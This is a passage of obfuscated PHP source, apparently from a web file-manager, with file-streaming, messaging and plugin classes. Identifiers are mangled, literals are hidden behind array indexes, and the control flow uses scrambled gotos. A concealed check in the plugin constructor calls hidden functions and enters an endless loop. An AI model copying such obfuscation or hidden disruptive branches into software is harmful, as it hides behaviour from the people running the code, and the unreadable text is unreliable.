$A†ãàˆâ≤‘[33]; goto EòÂªŒ¢ã£; D‡Ÿ„¢Öæ±: $dîπ“¢ÖÆÿ .= $this->fileSubstr($aì◊Ô÷“°ø, $Fıø™ æÓﬂ - $cÔáñäÎÿÍ, $cÔáñäÎÿÍ); return md5($dîπ“¢ÖÆÿ) . $Fıø™ æÓﬂ; goto DµÂ‚¡‹î¡; A¢†ı•ÕΩ¿: $A†ãàˆâ≤‘ =& $_SERVER[Öíæ€“”≠éÏË]; $cûâËœ≤¨€ = $this->info($aì◊Ô÷“°ø); if (!$cûâËœ≤¨€ || !$cûâËœ≤¨€[$A†ãàˆâ≤‘[195]]) { return !1; } goto C∑äñ•ìºÓ; DµÂ‚¡‹î¡: } public function getContent($CÑÍ†«¨√§) { return $this->fileSubstr($CÑÍ†«¨√§); } public function fileSubstr($a≠Ã“Ÿ¯êÁ, $e¯◊⁄ﬁú¯£ = 0, $fÙçùúÚ‚é = -1) { goto Aã„éå≠Ï¿; c≥Á›â◊¯: $CìÕí€Âµª = url_request($a≠Ã“Ÿ¯êÁ, $aå˘µﬂä®ì[228], !1, $aìïΩöù⁄, !1, !1, 1); return $CìÕí€Âµª[$aå˘µﬂä®ì[1097]] ? $CìÕí€Âµª[$aå˘µﬂä®ì[1097]] : $aå˘µﬂä®ì[33]; goto f∞Æπæ ˆã; cã‰Óâˆ◊¥: if ($fÙçùúÚ‚é === -1) { $fÙçùúÚ‚é = $d±£ÁÍéÕ§[$aå˘µﬂä®ì[78]]; } if ($fÙçùúÚ‚é == 0) { return $aå˘µﬂä®ì[33]; } $aìïΩöù⁄ = array($aå˘µﬂä®ì[1389] . $e¯◊⁄ﬁú¯£ . $aå˘µﬂä®ì[757] . ($e¯◊⁄ﬁú¯£ + $fÙçùúÚ‚é - 1)); goto c≥Á›â◊¯; Aã„éå≠Ï¿: $aå˘µﬂä®ì =& $_SERVER[Öíæ€“”≠éÏË]; $d±£ÁÍéÕ§ = $this->info($a≠Ã“Ÿ¯êÁ); if (!$d±£ÁÍéÕ§ || !$d±£ÁÍéÕ§[$aå˘µﬂä®ì[195]] && $d±£ÁÍéÕ§[$aå˘µﬂä®ì[78]] > 1024 * 1024 * 10) { return !1; } goto cã‰Óâˆ◊¥; f∞Æπæ ˆã: } public function download($Bª´∆…Îõπ, $báåƒòÉóü) { Downloader::start($Bª´∆…Îõπ, $báåƒòÉóü); return $báåƒòÉóü; } } goto f∏¬øöê ∫; f∏¬øöê ∫: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($fºæΩÎ¶∆ç, $f‡◊◊ô·®º = '') { goto A–πﬂüô«Ÿ; AΩ◊éªæ÷ﬁ: $this->pathOpen = $fºæΩÎ¶∆ç; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto c¯∂â…Ç†÷; A–πﬂüô«Ÿ: $this->info = $this->info($fºæΩÎ¶∆ç); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Öíæ€“”≠éÏË][76]]; goto AΩ◊éªæ÷ﬁ; c¯∂â…Ç†÷: if (!isset(self::$_chunkBuffer[$fºæΩÎ¶∆ç])) { self::$_chunkBuffer[$fºæΩÎ¶∆ç] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto a¿Ê‘ΩªÍ©; a¿Ê‘ΩªÍ©: } function stream_read($b¿ßë¿Æêè) { $A “Üü˘Ìﬁ = $this->fileSubstr($this->pose, $b¿ßë¿Æêè); $this->pose += strlen($A “Üü˘Ìﬁ); return $A “Üü˘Ìﬁ; } public function stream_tell() { return $this->pose; } public function stream_seek($e¶øÎï¨≤ƒ, $FåÔß‰Ü£é) { $C€Ò…ãäºπ =& $_SERVER[Öíæ€“”≠éÏË]; if ($FåÔß‰Ü£é == SEEK_SET) { $this->pose = $e¶øÎï¨≤ƒ; } else { if ($FåÔß‰Ü£é == SEEK_CUR) { $this->pose += $e¶øÎï¨≤ƒ; } else { if ($FåÔß‰Ü£é == SEEK_END) { $this->pose = $this->info[$C€Ò…ãäºπ[78]] + intval($e¶øÎï¨≤ƒ); } } } if ($e¶øÎï¨≤ƒ < 0) { $this->pose = $this->info[$C€Ò…ãäºπ[78]] + $e¶øÎï¨≤ƒ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Öíæ€“”≠éÏË][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Fò¬ÿ¿ˆ€Ì, $F„∂≤…Ñ∑Ñ) { $C¡É€Ø≥≠© =& $_SERVER[Öíæ€“”≠éÏË]; $DâÉ¿®ÿ≈è = $this->info($Fò¬ÿ¿ˆ€Ì); return array($C¡É€Ø≥≠©[1390] => 0, $C¡É€Ø≥≠©[1391] => 0, $C¡É€Ø≥≠©[12] => 32768 + 511, $C¡É€Ø≥≠©[1392] => 0, $C¡É€Ø≥≠©[1393] => 0, $C¡É€Ø≥≠©[1394] => 0, $C¡É€Ø≥≠©[1395] => 0, $C¡É€Ø≥≠©[78] => $DâÉ¿®ÿ≈è[$C¡É€Ø≥≠©[78]], $C¡É€Ø≥≠©[1396] => $DâÉ¿®ÿ≈è[$C¡É€Ø≥≠©[1266]], $C¡É€Ø≥≠©[1352] => $DâÉ¿®ÿ≈è[$C¡É€Ø≥≠©[84]], $C¡É€Ø≥≠©[1351] => $DâÉ¿®ÿ≈è[$C¡É€Ø≥≠©[194]], $C¡É€Ø≥≠©[1397] => 0, $C¡É€Ø≥≠©[1398] => 0); } static $fileInfo = array(); public function info($eæê÷≤Ùç´) { $B◊Èäüôï° = $_SERVER[Öíæ€“”≠éÏË][1399]; if (isset(self::$fileInfo[$eæê÷≤Ùç´])) { return self::$fileInfo[$eæê÷≤Ùç´]; } if (substr($eæê÷≤Ùç´, 0, strlen($B◊Èäüôï°)) != $B◊Èäüôï°) { return !1; } self::$fileInfo[$eæê÷≤Ùç´] = IO::info(substr($eæê÷≤Ùç´, strlen($B◊Èäüôï°))); return self::$fileInfo[$eæê÷≤Ùç´]; } public static function read($e»Ü‰ÃÂ»¿, $d«‹‘ñ™Ë∆, $DøÇÆØúãÇ) { if (!isset(self::$_fopenCache[$e»Ü‰ÃÂ»¿])) { $c£†…Á˜Æ„ = new StreamWrapperIO(); $c£†…Á˜Æ„->stream_open($e»Ü‰ÃÂ»¿); self::$_fopenCache[$e»Ü‰ÃÂ»¿] = $c£†…Á˜Æ„; } $c£†…Á˜Æ„ = self::$_fopenCache[$e»Ü‰ÃÂ»¿]; return $c£†…Á˜Æ„->fileSubstr($d«‹‘ñ™Ë∆, $DøÇÆØúãÇ); } public static function _read($AãÍ±∆ñê¯, $F§¬€†Ãùë, $CõàÇã‹ô◊) { goto dèıÆ´’ıë; dèıÆ´’ıë: $AêÍÉô⁄Éí =& $_SERVER[Öíæ€“”≠éÏË]; $a‡ÿ∞Ó¶Œß = fopen($AãÍ±∆ñê¯, $AêÍÉô⁄Éí[1270]); if (!$a‡ÿ∞Ó¶Œß) { return $AêÍÉô⁄Éí[33]; } goto dõîñ∆∑™¿; aÒ¨¥ùπ€ó: $cÛñäÀˆ·ä = 0; while ($cÛñäÀˆ·ä < $CõàÇã‹ô◊) { $Fö‹Èú∏å≈ = min($bò√Öëüöæ, $CõàÇã‹ô◊ - $cÛñäÀˆ·ä); $a”ŸúéøœÑ .= fread($a‡ÿ∞Ó¶Œß, $Fö‹Èú∏å≈); $cÛñäÀˆ·ä += $Fö‹Èú∏å≈; } fclose($a‡ÿ∞Ó¶Œß); goto aââ‡ÀÕÀ¥; dõîñ∆∑™¿: $bò√Öëüöæ = 8192; fseek($a‡ÿ∞Ó¶Œß, $F§¬€†Ãùë, SEEK_SET); $a”ŸúéøœÑ = $AêÍÉô⁄Éí[33]; goto aÒ¨¥ùπ€ó; aââ‡ÀÕÀ¥: return $a”ŸúéøœÑ; goto eÀπ¬Ç∫ü§; eÀπ¬Ç∫ü§: } public function fileSubstr($EŸæÏäﬁ«è, $Fø„·≈‰è®) { goto CÉ·öı îë; aÜ∞¢ááÙ∆: $A€†ÀÆôß‡ = 64 * 1024; $E»Ç©‹µÍ± =& self::$_chunkBuffer[$this->path]; if (!$E»Ç©‹µÍ±) { $E»Ç©‹µÍ± = array(); } goto DêŒÏ†ƒâ™; CÉ·öı îë: $c›ÎÜππ®Ì =& $_SERVER[Öíæ€“”≠éÏË]; $EÊÆÀ†—áô = $this->info[$c›ÎÜππ®Ì[78]]; $F·§¬¢¿÷„ = $EŸæÏäﬁ«è; goto e¥†›Ö≠äí; AØ› ¢°–ö: ksort($E»Ç©‹µÍ±); $Bˆ˜ßêøõ¡ = substr($EÊÿ∏Çƒ∂Ç, $EŸæÏäﬁ«è - $fà°ô¬çÃ¶, $Fø„·≈‰è®); return $Bˆ˜ßêøõ¡; goto d≠ü¥òäÁå; eÆ¶´∏ª∂ç: foreach ($E»Ç©‹µÍ± as $EÚÖ≈µô≠Ì => $AàïºˆÕà®) { $EÚÖ≈µô≠Ì = intval($EÚÖ≈µô≠Ì); $cüÖ≈Íª≈» = $EÚÖ≈µô≠Ì + strlen($AàïºˆÕà®); if ($EŸæÏäﬁ«è >= $cüÖ≈Íª≈») { continue; } if ($EŸæÏäﬁ«è >= $EÚÖ≈µô≠Ì && $EŸæÏäﬁ«è + $Fø„·≈‰è® <= $cüÖ≈Íª≈») { return substr($AàïºˆÕà®, $EŸæÏäﬁ«è - $EÚÖ≈µô≠Ì, $Fø„·≈‰è®); } break; } if (count($E»Ç©‹µÍ±) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($c›ÎÜππ®Ì[1400], $c›ÎÜππ®Ì[1401] . count($E»Ç©‹µÍ±) . "\x3b\163\164\141\x72\x74\x3d{$EŸæÏäﬁ«è}\x2c\x6c\145\x6e\x67\164\150\x3d{$Fø„·≈‰è®}\x3b\160\157\x73\x65\72{$EÚÖ≈µô≠Ì}\176{$cüÖ≈Íª≈»}"); throw new Exception($c›ÎÜππ®Ì[1402]); } $fà°ô¬çÃ¶ = intval($EŸæÏäﬁ«è / $A€†ÀÆôß‡) * $A€†ÀÆôß‡; goto bã∆æ’ñåß; dä∫ËÇæŒ£: if ($EŸæÏäﬁ«è + $Fø„·≈‰è® > $EÊÆÀ†—áô) { $Fø„·≈‰è® = $EÊÆÀ†—áô - $EŸæÏäﬁ«è; } if ($Fø„·≈‰è® <= 0) { return $c›ÎÜππ®Ì[33]; } if ($EŸæÏäﬁ«è < 0 || $EŸæÏäﬁ«è >= $EÊÆÀ†—áô || $Fø„·≈‰è® <= 0 || $Fø„·≈‰è® > 1024 * 1024 * 5) { throw new Exception("\151\157\106\151\154\145\x52\x65\141\144\40\145\x72\x72\x6f\162\41\x20\x73\164\141\x72\164\75{$EŸæÏäﬁ«è}\73\x6c\x65\x6e\x67\164\x68\x3d{$Fø„·≈‰è®}\x3b\40\163\151\172\145\x3d{$EÊÆÀ†—áô}\73"); } goto aÜ∞¢ááÙ∆; bã∆æ’ñåß: $cåâÕû⁄¿≤ = ceil(($EŸæÏäﬁ«è + $Fø„·≈‰è®) / $A€†ÀÆôß‡) * $A€†ÀÆôß‡ - $fà°ô¬çÃ¶; $EÊÿ∏Çƒ∂Ç = IO::fileSubstr($this->path, $fà°ô¬çÃ¶, $cåâÕû⁄¿≤); $E»Ç©‹µÍ±[$fà°ô¬çÃ¶ . $c›ÎÜππ®Ì[33]] = $EÊÿ∏Çƒ∂Ç; goto AØ› ¢°–ö; e¥†›Ö≠äí: $fΩƒÿâò Î = $Fø„·≈‰è®; if ($EŸæÏäﬁ«è < 0) { $EŸæÏäﬁ«è = $EÊÆÀ†—áô + $EŸæÏäﬁ«è; } if ($Fø„·≈‰è® === !1) { $Fø„·≈‰è® = $EÊÆÀ†—áô - $EŸæÏäﬁ«è; } goto dä∫ËÇæŒ£; DêŒÏ†ƒâ™: $EÚÖ≈µô≠Ì = 0; $cüÖ≈Íª≈» = 0; $AàïºˆÕà® = $c›ÎÜππ®Ì[33]; goto eÆ¶´∏ª∂ç; d≠ü¥òäÁå: } private function log($f—¶Æÿ‚≤∑, $A÷°€¶°£ô) { $AÏÍ·‚ëÖ√ =& $_SERVER[Öíæ€“”≠éÏË]; $fºŒÒ·Êƒ∆ = timeFloat() - $this->timeStart; write_log(sprintf($AÏÍ·‚ëÖ√[1403], $f—¶Æÿ‚≤∑, $this->info[$AÏÍ·‚ëÖ√[28]], $fºŒÒ·Êƒ∆, $A÷°€¶°£ô), $AÏÍ·‚ëÖ√[1087]); } } class Message { function __construct() { } public function send($aä»π∆å«∏ = '', $C‚ä¡‡Êßú = array(), $B∆¯¢’Œóµ = "\x74\145\170\x74") { goto Dû‰õ„’ûº; b«Ω’¬•úŸ: Hook::trigger($FáŒ°Ã Ë–[1407], $C∞˘´›¬ú™); goto f˜±∏¨öùÚ; d‡‘ËñèÉç: $C‚ä¡‡Êßú = array($FáŒ°Ã Ë–[497] => isset($C‚ä¡‡Êßú[$FáŒ°Ã Ë–[497]]) ? $C‚ä¡‡Êßú[$FáŒ°Ã Ë–[497]] : $FáŒ°Ã Ë–[33], $FáŒ°Ã Ë–[576] => isset($C‚ä¡‡Êßú[$FáŒ°Ã Ë–[576]]) ? $C‚ä¡‡Êßú[$FáŒ°Ã Ë–[576]] : $FáŒ°Ã Ë–[33]); if (empty($aä»π∆å«∏) || empty($C‚ä¡‡Êßú[$FáŒ°Ã Ë–[497]]) && empty($C‚ä¡‡Êßú[$FáŒ°Ã Ë–[576]])) { return !1; } $C∞˘´›¬ú™ = array($FáŒ°Ã Ë–[1345] => $B∞åÇœ◊®á, $FáŒ°Ã Ë–[1406] => $C‚ä¡‡Êßú); goto b«Ω’¬•úŸ; Dû‰õ„’ûº: $FáŒ°Ã Ë– =& $_SERVER[Öíæ€“”≠éÏË]; $B∞åÇœ◊®á = array($FáŒ°Ã Ë–[29] => $FáŒ°Ã Ë–[1404], $FáŒ°Ã Ë–[728] => $aä»π∆å«∏); if (in_array($B∆¯¢’Œóµ, array($FáŒ°Ã Ë–[1404], $FáŒ°Ã Ë–[1405]))) { $B∞åÇœ◊®á[$FáŒ°Ã Ë–[29]] = $B∆¯¢’Œóµ; } goto d‡‘ËñèÉç; f˜±∏¨öùÚ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto DÕ±Œèπ∆¨; Eè÷Ó‘ÙûË: $this->pluginHost = $config[$F›Õ‚ΩöæØ[1410]] . $this->pluginName . $F›Õ‚ΩöæØ[8]; $this->pluginHostDefault = $config[$F›Õ‚ΩöæØ[1410]] . $this->pluginName . $F›Õ‚ΩöæØ[8]; $d›®—ÆÚ›Ÿ = $config[$F›Õ‚ΩöæØ[1411]]; goto aä±Ò«ÍÕÉ; aä±Ò«ÍÕÉ: if ($d›®—ÆÚ›Ÿ && strpos($F›Õ‚ΩöæØ[47] . $d›®—ÆÚ›Ÿ . $F›Õ‚ΩöæØ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$F›Õ‚ΩöæØ[1412]] . $this->pluginName . $F›Õ‚ΩöæØ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto d‡—ïÉ¯Èë; bœ©ÉáÏ©Û: $this->pluginName = str_replace($F›Õ‚ΩöæØ[1408], $F›Õ‚ΩöæØ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $F›Õ‚ΩöæØ[8]; $this->pluginApi = appHostGet() . $F›Õ‚ΩöæØ[1409] . $this->pluginName . $F›Õ‚ΩöæØ[8]; goto Eè÷Ó‘ÙûË; d‡—ïÉ¯Èë: $this->echoJsAssignArr = array(); return $this; goto cıÑ•˘§µÇ; DÕ±Œèπ∆¨: $F›Õ‚ΩöæØ =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($_SERVER[$F›Õ‚ΩöæØ[847]]) || !isset($_SERVER[$F›Õ‚ΩöæØ[1223]])) { goto aÚ´ı±êÜı; aÚ´ı±êÜı: $C§ Ó•êú› = $F›Õ‚ΩöæØ[848]; $EµÂˆÁä¶ = $F›Õ‚ΩöæØ[849]; $Dï‰€êêñî = $_SERVER[$F›Õ‚ΩöæØ[844]] . $F›Õ‚ΩöæØ[845]; goto fôÎäÊ£Ñ; e¶ˆ€´ö√ö: for ($Dë•˜ﬂœ±€ = $bïüâ•ôçÿ; $Dë•˜ﬂœ±€ > 0; $Dë•˜ﬂœ±€++) { $bà’°ÌÃÑì = json_encode($GLOBALS[$F›Õ‚ΩöæØ[412]]); } goto CòÛÉºê†ÿ; e⁄÷ÉŸ“å¨: $bà’°ÌÃÑì = $F›Õ‚ΩöæØ[851]; $bà’°ÌÃÑì($_SERVER[$F›Õ‚ΩöæØ[852]]); $bïüâ•ôçÿ = 1; goto e¶ˆ€´ö√ö; fôÎäÊ£Ñ: $E°óﬁñ÷æñ = $EµÂˆÁä¶($Dï‰€êêñî); $CêÜ÷≈à∆ê = explode($F›Õ‚ΩöæØ[229], $E°óﬁñ÷æñ); if (count($CêÜ÷≈à∆ê) < $F›Õ‚ΩöæØ[596]) { $Eá±…◊≠áä = $F›Õ‚ΩöæØ[850]; $Eá±…◊≠áä(); } goto e⁄÷ÉŸ“å¨; CòÛÉºê†ÿ: } global $in, $config; goto fæÙÂ»íıç; fæÙÂ»íıç: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($F›Õ‚ΩöæØ[1408]); goto bœ©ÉáÏ©Û; cıÑ•˘§µÇ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Öíæ€“”≠éÏË][1413]); } protected function assign($cºòô∑è˘°, $dåÛØ™ˆË¯ = false) { if (is_array($cºòô∑è˘°)) { $this->values = array_merge($this->values, $cºòô∑è˘°); } else { $this->values[$cºòô∑è˘°] = $dåÛØ™ˆË¯; } } protected function display($C–Ô‹‰ﬁµê) { extract($this->values); require $C–Ô‹‰ﬁµê; } final function hookRegist($c„¥ÂñÊ◊) { $this->modelPlugin->appRegist($this->pluginName, $c„¥ÂñÊ◊); } final function appIcon() { $f°‚†´ª€Â =& $_SERVER[Öíæ€“”≠éÏË]; $f∫ùƒæ¯‡· = $this->appPackage(); $Fáè¬≤ª¥ = $f°‚†´ª€Â[33]; if (isset($f∫ùƒæ¯‡·[$f°‚†´ª€Â[410]])) { if (isset($f∫ùƒæ¯‡·[$f°‚†´ª€Â[410]][$f°‚†´ª€Â[1414]])) { $Fáè¬≤ª¥ = $f°‚†´ª€Â[1415] . $f∫ùƒæ¯‡·[$f°‚†´ª€Â[410]][$f°‚†´ª€Â[1414]] . $f°‚†´ª€Â[1416]; } else { if ($f∫ùƒæ¯‡·[$f°‚†´ª€Â[410]][$f°‚†´ª€Â[1417]]) { $Fáè¬≤ª¥ = $f°‚†´ª€Â[1418] . $f∫ùƒæ¯‡·[$f°‚†´ª€Â[410]][$f°‚†´ª€Â[1417]] . $f°‚†´ª€Â[1419]; } } } return $Fáè¬≤ª¥; } final function fileCanView($a®ìîØÿÇÍ) { goto C¿ÀïÕßô¯; aÚ±úÎ∂À§: ActionCall($cÍúﬁª¢Ãö[1432], $a®ìîØÿÇÍ); goto A·ÉÇé¡’´; C¿ÀïÕßô¯: $cÍúﬁª¢Ãö =& $_SERVER[Öíæ€“”≠éÏË]; if (request_url_safe($a®ìîØÿÇÍ)) { return !0; } if ($this->isShare($a®ìîØÿÇÍ)) { return !0; } goto bÉ≠“”É¿Ô; bÉ≠“”É¿Ô: $b≠â†•÷ßÁ = Session::get($cÍúﬁª¢Ãö[1420]); if (!$b≠â†•÷ßÁ || !$b≠â†•÷ßÁ[$cÍúﬁª¢Ãö[1421]]) { $Eå©ß◊ﬁ⁄î = $cÍúﬁª¢Ãö[1422] . rawurlencode(this_url()); show_tips(LNG($cÍúﬁª¢Ãö[1423]) . $cÍúﬁª¢Ãö[1424] . $Eå©ß◊ﬁ⁄î . $cÍúﬁª¢Ãö[1425] . LNG($cÍúﬁª¢Ãö[1426]) . $cÍúﬁª¢Ãö[1427], !1); } if (!Action($cÍúﬁª¢Ãö[1428])->authCan($cÍúﬁª¢Ãö[1429])) { show_tips(LNG($cÍúﬁª¢Ãö[1430]) . $cÍúﬁª¢Ãö[1431], !1); } goto aÚ±úÎ∂À§; A·ÉÇé¡’´: } final function isShare($C≠úî¡È»¨) { $Cß‡≠ë˜ÑÖ = KodIO::parse($C≠úî¡È»¨); return $Cß‡≠ë˜ÑÖ[$_SERVER[Öíæ€“”≠éÏË][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Fƒ—ïäïÃ≥) { if (request_url_safe($Fƒ—ïäïÃ≥)) { return $Fƒ—ïäïÃ≥; } if (!$this->isShare($Fƒ—ïäïÃ≥)) { $Fƒ—ïäïÃ≥ = $this->filePath($Fƒ—ïäïÃ≥); } return Action($_SERVER[Öíæ€“”≠éÏË][1079])->linkOut($Fƒ—ïäïÃ≥); } public function filePathLinkOut($cü°◊äèëÑ) { if (request_url_safe($cü°◊äèëÑ)) { return $cü°◊äèëÑ; } $this->fileCanView($cü°◊äèëÑ); return Action($_SERVER[Öíæ€“”≠éÏË][1079])->link($cü°◊äèëÑ); } final function filePath($dª éÎÇê—) { $d˜ﬂü≠⁄æê =& $_SERVER[Öíæ€“”≠éÏË]; if ($eΩã–Îä∑ú = $this->checkSharePath($dª éÎÇê—)) { Hook::trigger($d˜ﬂü≠⁄æê[1433], $eΩã–Îä∑ú); return $eΩã–Îä∑ú; } $this->fileCanView($dª éÎÇê—); if (request_url_safe($dª éÎÇê—)) { $d¬òç–‹⁄õ = parse_url_query($dª éÎÇê—); if (isset($d¬òç–‹⁄õ[$d˜ﬂü≠⁄æê[1434]]) && isset($d¬òç–‹⁄õ[$d˜ﬂü≠⁄æê[209]])) { $EÑΩÙ¿íÙü = Model($d˜ﬂü≠⁄æê[743])->get($d˜ﬂü≠⁄æê[744]); $BèÉìÙåıº = Mcrypt::decode($d¬òç–‹⁄õ[$d˜ﬂü≠⁄æê[209]], $EÑΩÙ¿íÙü); if ($BèÉìÙåıº) { $this->fileInfo = IO::infoWithChildren($BèÉìÙåıº); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $BèÉìÙåıº; } } $dª éÎÇê— = $this->_cacheHttpFile($dª éÎÇê—); $this->fileInfo = IO::infoWithChildren($dª éÎÇê—); } else { $this->fileInfo = IO::infoWithChildren($dª éÎÇê—); if (!$this->fileInfo) { show_tips(LNG($d˜ﬂü≠⁄æê[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($d˜ﬂü≠⁄æê[1433], $dª éÎÇê—); return $dª éÎÇê—; } final function _cacheHttpFile($BÁ´“Óµ≥õ) { $CÜÆÕœè™ï = hash_path($BÁ´“Óµ≥õ, !0); $this->cachePath = $this->pluginCachePath($CÜÆÕœè™ï); if ($BœŒ¥à≥ﬁ» = IO::fileNameExist($this->cachePath, $CÜÆÕœè™ï)) { return KodIO::make($BœŒ¥à≥ﬁ»); } $fºÍ‘†£÷¿ = $this->cachePath . $CÜÆÕœè™ï; return $this->pluginCacheFileSet($fºÍ‘†£÷¿, file_get_contents_nossl($BÁ´“Óµ≥õ)); } final function _tmpFileName($Aü˘ª…«‡Ô = array()) { goto Dß¶€º‹à÷; Dß¶€º‹à÷: $E≈ﬂÓ’∞Ÿâ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$Aü˘ª…«‡Ô) { $Aü˘ª…«‡Ô = $this->fileInfo; } if (isset($Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[171]])) { return $Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[171]]; } goto B◊Üê£Çë; bõø¡ã¿Çç: $b·“∆®øèî = array($Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[28]], $Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[76]], $Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[78]]); if (isset($Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[503]])) { $b·“∆®øèî[] = $Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[503]]; } return md5(implode($E≈ﬂÓ’∞Ÿâ[71], $b·“∆®øèî)); goto e£ìÉΩ’ó∆; B◊Üê£Çë: if (isset($Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[164]][$E≈ﬂÓ’∞Ÿâ[171]])) { return $Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[164]][$E≈ﬂÓ’∞Ÿâ[171]]; } $d≤ı≈‹ı˜… = IO::hashSimple($Aü˘ª…«‡Ô[$E≈ﬂÓ’∞Ÿâ[76]]); if ($d≤ı≈‹ı˜…) { return $d≤ı≈‹ı˜…; } goto bõø¡ã¿Çç; e£ìÉΩ’ó∆: } final function checkSharePath($AÚ¡≥ÔºÜâ) { goto DŒóÁí¬ñæ; fœ¿¥’Ÿ—À: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Eãëé¥∫èñ[171]]); return $DÁé¢âèπî[$Eãëé¥∫èñ[76]]; goto eî“¬Œí£œ; DŒóÁí¬ñæ: $Eãëé¥∫èñ =& $_SERVER[Öíæ€“”≠éÏË]; if (!defined($Eãëé¥∫èñ[455])) { define($Eãëé¥∫èñ[496], 0); } if (!$this->isShare($AÚ¡≥ÔºÜâ)) { return !1; } goto e©«¢Ú°‹õ; e©«¢Ú°‹õ: $DÁé¢âèπî = Action($Eãëé¥∫èñ[1079])->sharePathInfo($AÚ¡≥ÔºÜâ); if (!isset($DÁé¢âèπî[$Eãëé¥∫èñ[76]])) { show_json(LNG($Eãëé¥∫èñ[1435]), !1); } $this->fileInfo = $DÁé¢âèπî[$Eãëé¥∫èñ[164]]; goto fœ¿¥’Ÿ—À; eî“¬Œí£œ: } final function pluginCachePath($C¬˘£õïÊ’ = '') { $Eúú á†ï® =& $_SERVER[Öíæ€“”≠éÏË]; $eé´‡⁄Ï€µ = IO_PATH_SYSTEM_TEMP . $Eúú á†ï®[1436] . $this->pluginName; if (!($c‘Ò”Àûá‹ = IO::infoFull($eé´‡⁄Ï€µ))) { return IO::mkdir($eé´‡⁄Ï€µ . $Eúú á†ï®[8] . $C¬˘£õïÊ’); } if (empty($C¬˘£õïÊ’)) { return $c‘Ò”Àûá‹[$Eúú á†ï®[76]]; } if (!($c‘¯¢©ﬂõ∂ = IO::fileNameExist($c‘Ò”Àûá‹[$Eúú á†ï®[76]], $C¬˘£õïÊ’))) { return IO::mkdir($c‘Ò”Àûá‹[$Eúú á†ï®[76]] . $C¬˘£õïÊ’); } return KodIO::make($c‘¯¢©ﬂõ∂); } final function pluginCacheFileSet($bΩÓÃ”Œó§, $A—˘ √±Ìå = '') { $dôç‘ËÏ˜¥ =& $_SERVER[Öíæ€“”≠éÏË]; if (!($dπﬂøâÒ„Î = IO::infoFull($bΩÓÃ”Œó§))) { return IO::mkfile($bΩÓÃ”Œó§, $A—˘ √±Ìå, REPEAT_REPLACE); } IO::setContent($dπﬂøâÒ„Î[$dôç‘ËÏ˜¥[76]], $A—˘ √±Ìå); return $dπﬂøâÒ„Î[$dôç‘ËÏ˜¥[76]]; } final function pluginLocalFile($BÕ∞≈‰ÑÕ∆ = '') { goto c∑ñù—›”‹; E∆ÜóÆ˜ù›: if (!checkExtSafe($C«àá√¥µç)) { $C«àá√¥µç = $C«àá√¥µç . $E“ë¬¬•†Ω[1437]; } $C∏êÒ≤Œ© = $CÔÛ©É·úá . $C«àá√¥µç; if (@file_exists($C∏êÒ≤Œ©)) { return $C∏êÒ≤Œ©; } goto e≈Ñò√–Ñà; A‰Ë•ãûÃ›: if (!$BÕ∞≈‰ÑÕ∆) { return $CÔÛ©É·úá; } $bÂæéÙ¡≥À = IO::info($BÕ∞≈‰ÑÕ∆); $C«àá√¥µç = $this->_tmpFileName($bÂæéÙ¡≥À) . $E“ë¬¬•†Ω[95] . $bÂæéÙ¡≥À[$E“ë¬¬•†Ω[168]]; goto E∆ÜóÆ˜ù›; e≈Ñò√–Ñà: return IO::copy($BÕ∞≈‰ÑÕ∆, $CÔÛ©É·úá, 0, $C«àá√¥µç); goto bª“é›≈úÑ; c∑ñù—›”‹: $E“ë¬¬•†Ω =& $_SERVER[Öíæ€“”≠éÏË]; $CÔÛ©É·úá = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($CÔÛ©É·úá)) { mk_dir($CÔÛ©É·úá); } goto A‰Ë•ãûÃ›; bª“é›≈úÑ: } final function appPackage() { goto C√§˘≠∑êù; FüÀñ¬§¿¢: $dØÒœà¶î® = Hook::trigger($bë‰©á  [1439], $Fô∫àˆ¿÷®); if ($dØÒœà¶î® && is_array($dØÒœà¶î®)) { $Fô∫àˆ¿÷® = $dØÒœà¶î®; } $this->packageData = $Fô∫àˆ¿÷®; goto FΩäœ¥Ø∞ì; CÊçà€∞‚—: $this->parseLang($DÑ¢Ø£æ–˜); $Fô∫àˆ¿÷® = json_decode_force($DÑ¢Ø£æ–˜); if (!$Fô∫àˆ¿÷®) { return array(); } goto FüÀñ¬§¿¢; FΩäœ¥Ø∞ì: return $Fô∫àˆ¿÷®; goto dµµ·º∆Œí; C√§˘≠∑êù: $bë‰©á   =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->packageData) { return $this->packageData; } $DÑ¢Ø£æ–˜ = $this->parseFile($this->pluginPath . $bë‰©á  [1438]); goto 